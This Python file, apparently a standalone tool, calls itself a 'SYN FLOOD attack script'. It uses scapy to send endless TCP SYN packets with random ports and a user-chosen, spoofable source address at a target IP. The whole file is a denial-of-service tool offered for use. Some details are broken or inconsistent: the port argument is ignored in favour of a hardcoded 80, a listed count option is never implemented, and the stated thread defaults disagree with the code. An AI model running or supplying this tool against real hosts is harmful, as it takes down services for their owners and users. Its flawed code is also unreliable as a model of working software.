#!/usr/bin/python3

import argparse
from random import randint
from scapy.all import *
from scapy.layers.inet import IP, TCP

import ipaddress


def usage_header():
    print("SYN FLOOD attack script")
    print("")
    print("Usage: ./syn_flood.py ")


def usage_body():
    print("-t --threads                 - Number of concurrent threads to use [default 50]")
    print("-d --destination             - Ip of destination")
    print("-p --port                    - Port of destination")
    print("-s --source                  - Source ip address")
    print("-c --count					- Number of packets to send")
    print("")


def usage_example():
    print("Example: ./syn_flood.py -t 500 -d 10.1.5.2 -p 80 -s 10.1.2.2")


def usage():
    usage_header()
    usage_body()
    usage_example()
    sys.exit(0)


class Flooder(Thread):
    def __init__(self, target, ip):
        Thread.__init__(self)
        self.target = target
        self.ip = ip

    def build_packet(self):
        dest_port = 80
        src_port = randint(1025, 65535)
        sequence = randint(1000, 100000)

        opt = [("MSS", 65495), ("SAckOK", b''), ('Timestamp', (4294693388, 0)), ("NOP", None), ("WScale", 10)]
        window = 65495

        ip = IP(src=self.ip, dst=self.target)
        tcp = TCP(sport=src_port, dport=dest_port, flags="S", window=window, seq=sequence, options=opt)
        packet = ip / tcp

        return packet

    def run(self):
        packet = self.build_packet()

        try:
            send(packet, verbose=False)

        except KeyboardInterrupt:
            print("Operation interrupted by user...")
            sys.exit(0)


def check_param(destination_ip, port, source_ip, num_thread):
    ############### Check permissions ###############
    uid = os.getuid()
    if uid == 0:
        print("[*] Permissions look good.")
        time.sleep(0.5)
    else:
        print('[-] Not enough permissions to run this script. Try with sudo...')
        return -2

    ############### Check IPs ###############
    try:  # Check the destination address
        ipaddress.ip_address(destination_ip)
    except:
        print("Wrong destination address")
        return -1

    try:  # Check the source address
        ipaddress.ip_address(source_ip)
    except:
        print("Wrong source address")
        return -1


def run_atk(destination_ip, port, source_ip, num_thread):
    """
    TODO Check unused port
    :param destination_ip:
    :param source_ip:
    :param port:
    :param num_thread:
    :return:
    """
    check_param(destination_ip, port, source_ip, num_thread)

    target_port = port

    print('[*] Started SYN Flood on: {}'.format(destination_ip))
    while True:
        try:
            for x in range(0, num_thread):
                thread = Flooder(destination_ip, source_ip)
                thread.setDaemon(True)
                thread.start()
                thread.join()
        except KeyboardInterrupt:
            print('[-] Canceled by user...')
            sys.exit(0)


def main():
    parser = argparse.ArgumentParser(description="SYN FLOOD Attack Tool")
    parser.add_argument("-d", "--destination", help="Destination IP Address")
    parser.add_argument("-p", "--port", help="Destination Port")
    parser.add_argument("-s", "--source", help="Source address to send from")
    parser.add_argument("-t", "--threads", default=500, help="Number of threads to use")

    args = parser.parse_args()

    # Check length of input parameters and that the thread amount is a number
    if not len(sys.argv[1:]) or args.threads.isdigit() is False:
        usage()
        return -1

    run_atk(args.destination, int(args.port), args.source, int(args.threads))


if __name__ == "__main__":
    main()
